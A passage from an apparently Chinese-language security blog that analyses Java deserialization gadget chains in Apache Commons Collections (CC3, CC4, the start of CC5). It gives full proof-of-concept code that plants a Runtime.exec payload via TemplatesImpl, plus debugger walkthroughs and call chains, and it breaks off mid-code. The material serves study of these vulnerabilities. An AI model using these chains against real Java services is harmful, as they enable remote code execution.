class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">payload</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;CC3&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)ctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);</span><br><span class="line">        Object object=ctor.newInstance(Override.class,map1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先观察POC的前半部分，我们继续构造一个payload类并转换成字节码注入到TemplatesImpl对象的<code>_bytecodes</code>字段中</p>
<p>接下来这段代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>

<p>主要目的还是通过构造transformerChain以及lazyMap后，利用get方法调用transform函数形成调用链，关键在于transformers数组中的构造，数组中利用的是TrAXFilter和InstantiateTransformer</p>
<p>首先经过ConstantTransformer的transform函数后得到的是TrAXFilter类，然后调用InstantiateTransformer的transform函数，通过反射将TrAXFilter实例化，而在TrAXFilter的构造函数中，会调用TemplatesImpl的newTransformer方法，注意，InstantiateTransformer构造函数的第二个参数即是TrAXFilter的第一个参数，也就是我们构造的TemplatesImpl对象</p>
<p>为了能够调用LazyMap的get方法，这里依旧使用了AnnotationInvocationHandler类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">InvocationHandler invocationHandler=(InvocationHandler)ctor.newInstance(Override.class,lazyMap);</span><br><span class="line">Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);</span><br><span class="line">Object object=ctor.newInstance(Override.class,map1);</span><br></pre></td></tr></table></figure>

<p>AnnotationInvocationHandler类的invoke方法调用了get方法，那么如何调用AnnotationInvocationHandler的invoke方法，这里使用了动态代理的方式</p>
<p>会发现AnnotationInvocationHandler类实际上就是一个InvocationHandler，如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任何方法，就会进入到AnnotationInvocationHandler#invoke方法中，从而触发LazyMap#get</p>
<p>即对应POC以下部分：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">InvocationHandler invocationHandler=(InvocationHandler)ctor.newInstance(Override.class,lazyMap);</span><br><span class="line">Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);</span><br><span class="line">Object object=ctor.newInstance(Override.class,map1);</span><br></pre></td></tr></table></figure>

<h2 id="POC调试"><a href="#POC调试" class="headerlink" title="POC调试"></a>POC调试</h2><p>在AnnotationInvocationHandler中的readObject下断点，调试运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230517144455.png"></p>
<p>根据POC中知，我们将memberValues设置成了LazyMap对象，它在调用任何函数前都会先调用AnnotationInvocationHandler#invoke方法，于是在invoke方法中下断点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">                <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                        var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> var6;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>Object var6 = this.memberValues.get(var4);</code>中会调用LazyMap的get方法，进入该方法并下断点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时变量的值为</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230517145915.png"></p>
<p>在if判断中，不存在key为”entrySet”的值，故需要进入if中执行语句，注意this.factory的值正是我们构造的ChainedTransformer，这是通过LazyMap中的decorate实现的，所以会执行ChainedTransformer的transform方法，单步进入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>未执行for循环前变量的值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230517150505.png"></p>
<p>执行完一轮后，object变成了<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
<p>在执行第二轮for循环的时候，选择步入就到了InstantiateTransformer的transform函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var8);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var9);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时各参数的值为</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230517152936.png"></p>
<p>接下来的步骤就是实例化TrAXFilter对象，在其构造函数中会调用TemplatesImpl的newTransformer函数，之后的步骤与CC2链中一致</p>
<p>剩下部分由于中途环境问题不调试，道理一致</p>
<p><strong>调用链：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readobject</span><br><span class="line">-&gt;(proxy)lazyMap.entrySet</span><br><span class="line">-&gt;AnnotationInvocationHandler.invoke</span><br><span class="line">-&gt;lazyMap.get</span><br><span class="line">-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;ConstantTransformer.transform</span><br><span class="line">-&gt;InstantiateTransformer.transform</span><br><span class="line">-&gt;TrAXFilter(构造方法)</span><br><span class="line">-&gt;TemplatesImpl.newTransformer</span><br><span class="line">-&gt;TemplatesImpl.getTransletInstance</span><br><span class="line">-&gt;TemplatesImpl.defineTransletClasses</span><br><span class="line">-&gt;(动态创建的类)cc2.newInstance()</span><br><span class="line">-&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html">Java安全之Commons Collections3分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之Commons Collections4链</title>
    <url>/2023/01/15/Java-CC4/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>java版本：jdk8u66</p>
<p>Commons Collections：4.0</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>CC2和CC3的结合</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建恶意类</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">payload</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;CC4&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建恶意对象TemplatesImpl，将payload注入其_bytecodes字段</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建ChainedTransformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 构建comparator</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 借助PriorityQueue</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// System.out.println(barr);</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getTransletInstancePriorityQueue.readObject</span><br><span class="line">-&gt;PriorityQueue.heapify</span><br><span class="line">-&gt;PriorityQueue.siftDown</span><br><span class="line">-&gt;PriorityQueue.siftDownUsingComparator</span><br><span class="line">-&gt;TransformingComparator.compare</span><br><span class="line">-&gt;ChainedTransformer.transform</span><br><span class="line">-&gt;TrAXFilter(构造方法)</span><br><span class="line">-&gt;TemplatesImpl.newTransformer</span><br><span class="line">-&gt;TemplatesImpl.getTransletInstance</span><br><span class="line">-&gt;TemplatesImpl.defineTransletClasses</span><br><span class="line">-&gt;(动态创建的类)cc4.newInstance()</span><br><span class="line">-&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>CC4链是CC2链和CC3链相结合，其中以CC2链中的PriorityQueue为入口，CC3链中的TrAXFilter+InstantiateTransformer为触发点。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/nice0e3/p/14032604.html">Java安全之Commons Collections4分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之Commons Collections5链</title>
    <url>/2023/01/16/Java-CC5/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）</p>
<p>同时需要关闭<code>security manager</code> ，But</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This only works in JDK 8u76 and WITHOUT a security manager</span><br></pre></td></tr></table></figure>

<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>存在于包<code>org.apache.commons.collections.keyvalue</code>中</p>
<p>构造函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过构造函数可以传入Map对象，并且其getValue方法调用了map的get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时其equals、hashCode、toString等方法都调用了getValue方法</p>
<p>如toString方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方文档：<a href="https://commons.apache.org/proper/commons-collections//javadocs/api-3.2.2/">https://commons.apache.org/proper/commons-collections//javadocs/api-3.2.2/</a></p>
<h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><p>存在于包<code>javax.management</code>中，是Exception类的子类</p>
<p><strong>其实现了序列化，并重写了readObject方法</strong></p>
<p>readObject方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 获取序列化字段</span></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="comment">// 获取序列化字段val的值</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 判断是否为String类型</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    <span class="comment">// 判断当前系统安全管理器是否存在，或者当前的值是否为以下类型   如果是则转换成String</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> 